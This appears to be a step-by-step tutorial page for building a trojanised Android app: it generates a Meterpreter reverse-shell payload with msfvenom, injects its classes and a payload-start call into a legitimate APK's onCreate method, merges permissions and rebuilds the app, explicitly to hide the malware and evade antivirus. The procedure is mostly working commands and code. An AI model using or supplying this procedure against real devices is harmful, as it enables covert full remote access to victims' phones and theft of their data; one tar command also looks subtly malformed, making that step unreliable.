# Malicious APK with MSF Venom

We will now see how to create a malicious APK file that will provide full access to an Android device. Then, we will proceed to download a standard APK and combine it with our malicious APK. This fusion aims to conceal the malicious nature of the file and make it harder to detect at first glance. Additionally, we will learn how to sign the resulting APK to evade detection by antivirus systems.



## **Required applications:**

**APKTool** is a tool that allows you to decompile and recompile Android APK files. It is used to modify applications, translate them, analyze their functionality, or study their security, making it possible to edit resources and source code.

<figure><img src="https://apktool.org/img/logo.png" alt=""><figcaption></figcaption></figure>



**Uber APK Signer** is a tool used to sign and verify APK files, ensuring they can be installed on Android devices and maintaining their integrity after modifications.

<figure><img src="../.gitbook/assets/feature_uber-apk-signer_hu5bbfe30042bd23f147a6d6cd4ace5264_41395_660x0_resize_box_3.png" alt="" width="165"><figcaption></figcaption></figure>



**Msfvenom** is a tool used to create malicious APKs with embedded payloads, enabling remote access to Android devices. It’s commonly used in penetration testing to test security vulnerabilities.

<figure><img src="https://pbs.twimg.com/profile_images/580131056629735424/2ENTk2K2_400x400.png" alt="" width="188"><figcaption></figcaption></figure>

## Step-by-step documentation

1. Download APK where the malicious will be hidden

[APKMonk download page](https://www.apkmonk.com/)

2. Generate malicious APK using msfvenom

```bash
msfvenom -p android/meterpreter/reverse_tcp LHOST=<ip> LPORT=<port> R > msf.apk
```

<figure><img src="https://lh3.googleusercontent.com/u9xS5u0Wabo1duMoIuKKINwXFcWIZEeHRkiiO-EGXhvgB4cLJq4ETm2Ah0dkN0x1uQ0_CgBxmeacAd5OFtfPcYfnH0lSxF520cn7GvRgJ-5Eh-xAT9Y3BbUKFfFh9mBxqw=w1280" alt=""><figcaption></figcaption></figure>

3. Decompile both APKs with Apktool

```bash
java -jar apktool.jar d <file.apk>
```

<figure><img src="../.gitbook/assets/1.png" alt=""><figcaption></figcaption></figure>

4. Copy classes from malicious APK to original APK

```bash
cd msf
tar -cd - ./smali | ( cd ./<dir_apk_original>; tar -xpf - )
```

<figure><img src="https://lh4.googleusercontent.com/kmv9KemLctbnTan4pkY9mE_jxcZJmUUE3O8iME2OcKfAH8BLGGKl7COjgVwo2yzF3FH9jLrKsbH88199NwYNbMMjDYTqDofCI2A55eD9Y-XM97no16gvwWDYVM5twALTVA=w1280" alt=""><figcaption></figcaption></figure>

5. Find main file from original APK

```bash
grep "MAIN" <dir_apk_original>/AndroidManifest.xml
```

<figure><img src="https://lh6.googleusercontent.com/NV0MZJDmJ13uwn08-GyatNud2pH1BIijV254FYzPecMrfqdBOeLNijxxgFTGJVsTKYxTHRq6wLAveN2smXIg5VpsklJsTK-lkxGT2WZSipo31nUQ_yEU1qupbqAfcoAwpw=w1280" alt=""><figcaption></figcaption></figure>

6. Insert payload in the OnCreate method

```bash
invoke-static {p0}, Lcom/metasploit/stage/Payload;->start(Landroid/content/Context;)V
```

<figure><img src="https://lh6.googleusercontent.com/NUhi60jD9nuffsyY-uMPL8ByDQ8Imp4INEln5YtByL-33qgz4SiIxApGgv4jRGrdST4wK2u8j-0SlUrKa1TWo4v7uH-LGI6bUt6tU7qKXxZ_p1N_2PTUTTpDruPnDAE6Hg=w1280" alt=""><figcaption></figcaption></figure>

7. Copy permissions from msf/AndroidManifest.xml

```bash
grep "<uses-permission" msf/AndroidManifest.xml
```

<figure><img src="https://lh6.googleusercontent.com/OPol5zzCjc08hulZ3J9m7ZTfvsxqcs2NH3h5n4n4pQLh8PxZiPYKy8zMz8MY2UE18oAoIHZQXBU9rC8MH_IbWYqP01RDdjO9Cgmxqk68qAk5I055ZW-mJ7Mr95mUvi9JGg=w1280" alt=""><figcaption></figcaption></figure>

8. Add permissions to the original APK

> It is important not to add permissions that already exist, if there are any duplicates we must eliminate them.

```bash
nano <dir_apk_original>/AndroidManifest.xml
```

<figure><img src="../.gitbook/assets/4.png" alt=""><figcaption></figcaption></figure>

9. Build the original APK

```bash
java -jar apktool.jar b <dir_apk_original> -o <file.apk>
```

<figure><img src="https://lh4.googleusercontent.com/pdAybD2ov36xeF6vwc54rz9g8_BMR1ECVZMLBZ0AnL52Z_oY_cgAZ4-akB6DR-XG2wULG93M9Ad7TiTe8Odt2OTNeT6tR8OTlziUT3DEMtjmEmvtW2GAwFdkeiMw4HmJ4A=w1280" alt=""><figcaption></figcaption></figure>

